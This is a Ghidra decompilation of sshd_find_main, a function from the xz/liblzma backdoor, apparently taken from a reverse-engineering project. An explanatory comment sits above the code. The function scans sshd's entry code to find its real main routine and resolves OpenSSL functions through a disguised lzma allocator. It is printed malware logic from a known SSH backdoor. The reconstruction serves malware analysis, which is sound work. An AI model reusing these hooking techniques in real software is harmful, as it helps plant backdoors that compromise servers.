// /home/kali/xzre-ghidra/xzregh/102550_sshd_find_main.c
// Function: sshd_find_main @ 0x102550
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_main(u8 * * code_start_out, elf_info_t * sshd, elf_info_t * libcrypto, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Walks sshd's entry thunk from `Elf64_Ehdr::e_entry`, borrowing the fake lzma allocator (with `libcrypto` stored in
 * `opaque`) to fetch `EVP_PKEY_new_raw_public_key`, `EVP_Digest`, and `EVP_sha256`. While decoding instructions it watches
 * for a RIP-relative MOV/LEA that materialises the real `sshd_main` pointer and insists that the very next CALL targets
 * the `__libc_start_main@GOT` slot via the same register. When the pattern matches it records the discovered entry point,
 * bumps the resolved-count for every EVP helper it cached into `imported_funcs`, and hands the caller the exact code
 * address instead of the PLT stub.
 */

#include "xzre_types.h"

BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
                   imported_funcs_t *imported_funcs)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  BOOL BVar3;
  lzma_allocator *allocator_00;
  u8 *puVar4;
  pfn_EVP_PKEY_new_raw_public_key_t ppVar5;
  u8 *puVar6;
  Elf64_Sym *pEVar7;
  u8 *puVar8;
  long lVar9;
  dasm_ctx_t *pdVar10;
  uchar *code_start;
  u8 *code_end;
  u8 *puVar11;
  u8 *puVar12;
  byte bVar13;
  dasm_ctx_t insn_ctx;
  lzma_allocator *allocator;
  u8 *code_segment_start;
  u8 *code_segment_end;
  u8 *libc_start_main_got;
  u8 *sshd_main_candidate;
  u64 code_segment_size;
  u64 local_88;
  dasm_ctx_t local_80;
  
  bVar13 = 0;
  local_88 = 0;
  allocator_00 = get_lzma_allocator();
  allocator_00->opaque = libcrypto;
  puVar4 = (u8 *)elf_get_code_segment(sshd,&local_88);
  if (puVar4 != (u8 *)0x0) {
    puVar12 = puVar4 + local_88;
    ppVar5 = (pfn_EVP_PKEY_new_raw_public_key_t)lzma_alloc(0x758,allocator_00);
    imported_funcs->EVP_PKEY_new_raw_public_key = ppVar5;
    if (ppVar5 != (pfn_EVP_PKEY_new_raw_public_key_t)0x0) {
      imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
    }
    puVar6 = (u8 *)elf_get_got_symbol(sshd,STR_libc_start_main);
    if (((puVar6 != (u8 *)0x0) &&
        (code_start = sshd->elfbase->e_ident + sshd->elfbase->e_entry, code_start < puVar12)) &&
       (puVar4 <= code_start)) {
      pdVar10 = &local_80;
      lVar9 = 0x16;
      code_end = code_start + 0x200;
      if (puVar12 <= code_start + 0x200) {
        code_end = puVar12;
      }
      for (; lVar9 != 0; lVar9 = lVar9 + -1) {
        *(undefined4 *)&pdVar10->instruction = 0;
        pdVar10 = (dasm_ctx_t *)((long)pdVar10 + (ulong)bVar13 * -8 + 4);
      }
      pEVar7 = elf_symbol_get(libcrypto,STR_EVP_Digest,0);
      if (pEVar7 != (Elf64_Sym *)0x0) {
        EVar1 = pEVar7->st_value;
        pEVar2 = libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EVP_Digest = (pfn_EVP_Digest_t)(pEVar2->e_ident + EVar1);
      }
      puVar11 = (u8 *)0x0;
      while (code_start < code_end) {
        BVar3 = x86_dasm(&local_80,code_start,code_end);
        if (BVar3 == FALSE) {
          code_start = code_start + 1;
        }
        else {
          if (*(u32 *)&local_80.opcode_window[3] == 0x10d) {
            if ((((((byte)local_80.prefix.decoded.rex & 0x48) == 0x48) &&
                 ((uint)local_80.prefix.decoded.modrm >> 8 == 0x50700)) &&
                (puVar8 = local_80.instruction + local_80.mem_disp + local_80.instruction_size,
                puVar4 <= puVar8)) && (puVar8 < puVar12)) {
              puVar11 = puVar8;
            }
          }
          else if (((puVar11 != (u8 *)0x0) && (*(u32 *)&local_80.opcode_window[3] == 0x17f)) &&
                  (((uint)local_80.prefix.decoded.modrm >> 8 == 0x50200 &&
                   (((local_80.prefix.decoded.flags2 & 1) != 0 &&
                    (puVar6 == local_80.instruction + local_80.instruction_size + local_80.mem_disp)
                    ))))) {
            pEVar7 = elf_symbol_get(libcrypto,STR_EVP_sha256,0);
            if (pEVar7 != (Elf64_Sym *)0x0) {
              imported_funcs->EVP_sha256 =
                   (pfn_EVP_sha256_t)(libcrypto->elfbase->e_ident + pEVar7->st_value);
              imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
            }
            *code_start_out = puVar11;
            return TRUE;
          }
          code_start = code_start + local_80.instruction_size;
        }
      }
    }
    lzma_free(imported_funcs->EVP_PKEY_new_raw_public_key,allocator_00);
  }
  return FALSE;
}

